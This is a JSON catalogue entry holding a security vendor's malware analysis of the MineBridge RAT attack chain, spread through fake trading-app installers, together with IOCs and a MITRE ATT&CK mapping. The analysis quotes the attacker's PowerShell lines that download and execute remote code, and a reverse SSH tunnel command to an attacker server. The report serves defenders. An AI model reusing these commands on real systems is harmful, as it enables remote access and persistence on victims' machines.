# 0-raw-data/ORKL/library/jsons_entries/55cd7856-e521-4d69-871c-5b251935d2e1.json
{
    "id": "55cd7856-e521-4d69-871c-5b251935d2e1",
    "created_at": "2023-01-12T15:10:56.72069Z",
    "updated_at": "2025-03-27T02:08:40.75155Z",
    "deleted_at": null,
    "sha1_hash": "e861cbe6ede83f64a3d5e31d60e5eb5843f5e416",
    "title": "2021-06-24 - Demystifying the full attack chain of MineBridge RAT",
    "authors": "",
    "file_creation_date": "2022-05-28T19:35:41Z",
    "file_modification_date": "2022-05-28T19:35:41Z",
    "file_size": 1418540,
    "plain_text": "# Demystifying the full attack chain of MineBridge RAT\n\n**[zscaler.com/blogs/security-research/demystifying-full-attack-chain-minebridge-rat](https://www.zscaler.com/blogs/security-research/demystifying-full-attack-chain-minebridge-rat)**\n\n## Introduction\n\nIn March 2021, threat actors started distributing MineBridge RAT with an updated\n[distribution mechanism. Morphisec blogged about the partial attack chain of this new attack](https://blog.morphisec.com/minebridge-on-the-rise-sophisticated-delivery-mechanism)\nbut they could not find the origin or initial stages of the attack chain.\n\nIn May 2021, Zscaler ThreatLabz was able to uncover all the components of this complex\nmulti-stage attack chain which have never before been documented in their entirety in the\npublic domain.\n\nWe've blogged about MineBridge RAT before, [in February 2021. This is a RAT (remote](https://www.zscaler.com/blogs/security-research/return-minebridge-rat-new-ttps-and-social-engineering-lures)\naccess trojan) that misuses the remote desktop software TeamViewer for DLL side-loading,\nenabling the threat actor to take a wide array of remote follow-on actions such as spying on\nusers or deploying additional malware. It was first discovered in January 2020 targeting\nfinancial services organizations.\n\nWe discovered that the threat actors are now distributing MineBridge RAT through Windows\nInstaller binaries which masquerade as trading applications. The different stages in this\nsophisticated attack chain leverage Windows scheduled tasks, PowerShell scripts, reverse\nSSH tunnels, legitimate binaries such as TeamViewer, and shortened URLs that ultimately\nlead to the MineBridge RAT execution.\n\n## Attack flow\n\n\n-----\n\nFigure 1 below illustrates the full end-to-end attack chain.\n\n_Figure 1: Complete end-to-end attack chain used to deliver MineBridge RAT_\n\n## Technical analysis\n\nOn April 9th, 2021, threat actors registered the domain \"tradingview[.]cyou,\" a look-alike of\nthe legitimate website \"tradingview[.]com.\"\n\nA download link for the malicious TradingView Desktop application was placed on the\nhomepage.\n\nThe official TradingView desktop application was launched by tradingview.com in December\n2020 for the first time. This indicates that the threat actor is quick at identifying such\nopportunities to leverage them in their attack chain. Within 4 months of launch of the new\nofficial trading application, the threat actor registered a new domain to distribute the\nmalicious version of application.\n\nSimilar to this, other trading applications and bots often used by stock and crypto currency\ntraders have also been abused by the threat actor. The complete list of file hashes is\nincluded in the IOCs section\n\n\n-----\n\nFigure 2 and 3 below show the webpages corresponding to malicious and legitimate\ndomains.\n\n_Figure 2: Webpage of the malicious website_\n\n_Figure 3: Webpage of the legitimate website_\n\n\n-----\n\nThe download link (hxxps://tradingview[.]cyou/tradeview.php) on the attacker-controlled\ndomain leads to the download of a malicious Windows Installer.\n\n**Note: We noticed that the download URL responds with the malicious Windows Installer**\nonly if the user-agent string in the HTTP request headers corresponds to Windows 10 OS.\n\nFor the purpose of technical analysis, we will look at the Windows Installer with MD5 hash:\n4284ee1eef9dd7f020f5002d63def278\n\nThe installer is an Inno package which masquerades as a TradingView Desktop application\nand is digitally signed by YUNIVELL, LLC. The thumbprint of the digital signature is:\n93e9d0b1ea812672b825d7c6812d435cca9fff99\n\nFigure 4 below shows the content of the Inno package\n\n_Figure 4: Contents of the Inno setup package_\n\nBy pivoting on this thumbprint, we identified a few more trading applications which are used\nto spread MineBridge RAT as well. The hashes of these binaries are also mentioned in the\n**Indicators of compromise (IOCs) section.**\n\nUpon execution, this installer shows a GUI (Graphical User Interface) which spoofs a\nTradingView application while it performs malicious activities in the background.\n\nTo start malicious activities, the installer executes two PowerShell command lines which we\nhave referred to as Stage-1 PowerShell and Stage-2 PowerShell. The operations performed\nby these are explained in detail in the following sections.\n\n## [+] Stage-1 PowerShell\n\nFigure 5 below shows the relevant code section of Stage-1 PowerShell script\n\n\n-----\n\n_Figure 5: Stage-1 PowerShell code_\n\nBelow are the main operations performed by it.\n\n**1. Changes the current directory to: \"$env:programdata\\ssh\\\"**\n\n**2. Fetches SSHD config from the shortened URL: https://cutt[.]ly/UxtdKtn (redirects to:**\nhttps://cloud-check[.]website/online/tunupd.php?f=cfg) and writes it to the file: sshd_config\n\n**3. Adds the OpenSSH.Server Windows capability and starts the sshd service. Sets the**\nstartup type to Automatic.\n\n**4. Changes directory to the path: \"$env:userprofile\" and creates the \".ssh\" directory.**\n\n**5. Fetches the SSH keys from the URL: https://cutt[.]ly/Zxtd1Kl (redirects to: https://cloud-**\ncheck[.]website/online/tunupd.php?f=key) and writes them to the file: authorized_keys\n\n**6. Fetches the RSA private keys from the URL: https://cutt[.]ly/yxtdOo3 (redirects to:**\nhttps://cloud-check[.]website/online/tunupd.php?f=rsa) and writes them to the file:\ntun_id_rsa\n\n**7. Downloads the SSH client binary from the URL: https://cutt[.]ly/ubfAKPb (redirects to:**\nhttps://cloud-check[.]website/online/tunupd.php?f=ssh) and writes it to: ssh.exe\n\n**8. Executes the following command to set up a reverse SSH tunnel from the victim’s**\nmachine at port 109 to the attacker’s server at port 32672.\n\n[-N -R '+$RemotePort+':localhost:109 [email protected]'+$RemoteSrv+' -i](https://www.zscaler.com/cdn-cgi/l/email-protection)\n\"'+$env:userprofile+'\\.ssh\\tun_id_rsa\" -o \"StrictHostKeyChecking=no\" -o\n\"ExitOnForwardFailure=yes\" -o \"ServerAliveInterval=10\" -o \"ServerAliveCountMax=10\"';\n\nHere,\n\n$RemoteSrv: 86[.]106[.]181[.]183\n\n$RemotePort: 32672\n\n\n-----\n\nNote: Reverse SSH tunnelling helps the threat actor to bypass firewall rules since outbound\nconnection requests are generally not blocked.\n\n**9. Creates a new scheduled task with the name, \"OneDrive Sync\" which executes the**\nabove command line upon Logon, and once every 20 minutes.\n\n## [+] Stage-2 PowerShell\n\nFigure 6 below shows the relevant code section of Stage-2 PowerShell script.\n\n_Figure 6: Stage-2 PowerShell code_\n\nThe PowerShell script performs the following operations:\n\n**1. Creates a scheduled task with the name, \"Google Disk Sync\" which runs twice every**\nweek and executes the following code using PowerShell\n\n$b=\"https://\";\n\n$c=\"cutt[.]ly\";\n\n$d=\"/9nOFUuK\";\n\n$b+=$c;\n\n$b+=$d;\n\n$a=iwr $b -UseBasicPArsing |iex;\n\n$b=\"https://\";\n\n$c=\"cutt.ly\";\n\n$d=\"/HxPcxuH\";\n\n$b+=$c;\n\n$b+=$d;\n\n$a=iwr $b -UseBasicPArsing |iex;\n\nThis code performs following operations:\n\n-  Downloads and executes Stage-3 PowerShell code from: cutt[.]ly/9nOFUuK [redirects\nto: https://simpleclub[.]website/upd/?t=psns] which ultimately leads to NetSupport client\nexecution.\n\n\n-----\n\n-  Downloads and executes Stage-4 PowerShell code from: cutt[.]ly/HxPcxuH [redirects\nto: https://simpleclub[.]site/upd/?t=pstv] which ultimately leads to MineBridge RAT\nexecution.\n\n**2. Creates a scheduled task with the name, \"Google Photo Sync\" which runs twice every**\nweek and executes the following PowerShell command line:\n\n$b=\"https://\";\n$c=\"cutt[.]ly\";\n$d=\"/9nOFUuK\";\n$b+=$c;\n$b+=$d;\n$a=iwr $b -UseBasicPArsing |iex;\n\nThis again downloads and executes the Stage-3 PowerShell code from:\nhttps://cutt[.]ly/9nOFUuK [redirects to: https://simpleclub[.]website/upd/?t=psns]\n\n**Note: We have not detailed the Stage-3 PowerShell and Stage-4 PowerShell in this blog**\n[since the details for these two are already covered in the Morphisec blog.](https://blog.morphisec.com/minebridge-on-the-rise-sophisticated-delivery-mechanism)\n\n## Zscaler Cloud Sandbox report\n\nFigure 7 below shows the Zscaler cloud sandbox report for MineBridge RAT DLL.\n\n_Figure 7: Cloud sandbox report_\n\nIn addition to sandbox detections, Zscaler’s multilayered cloud security platform detects\nindicators at various levels.\n\n## MITRE ATT&CK TTP Mapping\n\n\n-----\n\n**ID** **Tactic** **Technique**\n\nT1566 Phishing Attacker hosted fake websites leading to malicious\nfile download\n\n\nT1204.002 User Execution:\nMalicious File\n\nT1059.001 Command and\nScripting Interpreter:\nPowerShell\n\nT1547.001 Registry Run Keys /\nStartup Folder\n\nT1053.005 Scheduled Task/Job:\nScheduled Task\n\nT1140 Deobfuscate/Decode\nFiles or Information\n\nT1036.004 Masquerading:\nMasquerade Task or\nService\n\nT1036.005 Masquerading: Match\nLegitimate Name or\nLocation\n\nT1027.002 Obfuscated Files or\nInformation: Software\nPacking\n\nT1574.002 Hijack Execution\nFlow: DLL SideLoading\n\nT1056.002 Input Capture: GUI\nInput Capture\n\n\nUser executes the downloaded file\n\n\nCaptures TeamViewer generated UsedID and\nPassword by hooking GUI APIs\n\n\nUses PowerShell in multiple stages to download\nand execute malicious payloads\n\n\nCreates LNK file in the startup folder for payload\nexecution\n\n\nCreates scheduled task to execute PowerShell\ncommands which further downloads and executes\nPowerShell scripts\n\n\nStrings and other data are obfuscated in the\npayloads\n\n\nScheduled tasks are created with name\nmasquerading Google and OneDrive\n\n\nDropped LNK file for persistence masquerades\nWindows Defender\n\n\nPayloads are packed in layers\n\n\nUses legit TeamViewer binary with dll-side loading\nvulnerability\n\n\n-----\n\nT1057 Process Discovery Verifies the name of parent process\n\n\nT1082 System Information\nDiscovery\n\nT1033 System Owner/User\nDiscovery\n\n\nGathers system OS version info\n\n\nGathers currently logged in Username\n\n\nT1572 Protocol Tunneling Creates Reverse SSH tunnel\n\n\nT1071.001 Application Layer\nProtocol:Web\nProtocols\n\nT1041 Exfiltration Over C2\nChannel\n\n\nUses https for network communication\n\n\nData is exfiltrated using existing C2 channel\n\n\n## Indicators of compromise (IOCs)\n\n**[+] Hashes**\n\n**MD5** **FileName** **Type**\n\n4284ee1eef9dd7f020f5002d63def278 TradingView.exe Installer\n\n68a010a3d0d25cfa13933199511ed897 Polarr_Setup (2).exe Installer\n\nffcd63dc98e64afbfea8718b747963d7 Bitcoin_Trade.exe Installer\n\n3281f3b30fb8f3c69b18cc7aadfdf697 Arbitrage_Bot.exe Installer\n\n796e091b18112e223749972c3f0888db Bitcoin_Trade.exe Installer\n\nb14632304a7543752fbf2e3b7c0eca59 msi.tiff (MineBridge RAT) Dll\n\n**[+] C2 domains**\n\n\n-----\n\n**Component** **Domain**\n\nPhishing website tradingview[.]cyou\n\n\ntradingview[.]cloud\n\ntradingview[.]digital\n\ntradingview[.]life\n\n\nPowerShell payloads cloud-check[.]website\n\n\nsimpleclub[.]website\n\nsimpledomen[.]website\n\nsimpleclub[.]site\n\n\nReverse SSH tunnel 86.106.181[.]183:32672\n\nNetSupport client update-system[.]cn\n\n\nupdatesystem[.]website\n\n\nMineBridge RAT ninjakick[.]club\n\n\npolarrsearch[.]xyz\n\nrogaikopyta[.]xyz\n\nutkailipa[.]xyz\n\n5tvstar[.]cn\n\ngoldendragon888[.]cn\n\n\n\n**[+] Windows Installer signer details**\n\nSigner name: YUNIVELL, LLC\n\nThumbprint: 93E9D0B1EA812672B825D7C6812D435CCA9FFF99\n\n**[+] Scheduled tasks name**\n\nOneDrive sync\n\nGoogle Disk Sync\n\nGoogle Photo Sync\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-24 - Demystifying the full attack chain of MineBridge RAT.pdf"
    ],
    "report_names": [
        "2021-06-24 - Demystifying the full attack chain of MineBridge RAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536256,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653766541,
    "ts_modification_date": 1653766541,
    "files": {
        "pdf": "https://archive.orkl.eu/e861cbe6ede83f64a3d5e31d60e5eb5843f5e416.pdf",
        "text": "https://archive.orkl.eu/e861cbe6ede83f64a3d5e31d60e5eb5843f5e416.txt",
        "img": "https://archive.orkl.eu/e861cbe6ede83f64a3d5e31d60e5eb5843f5e416.jpg"
    }
}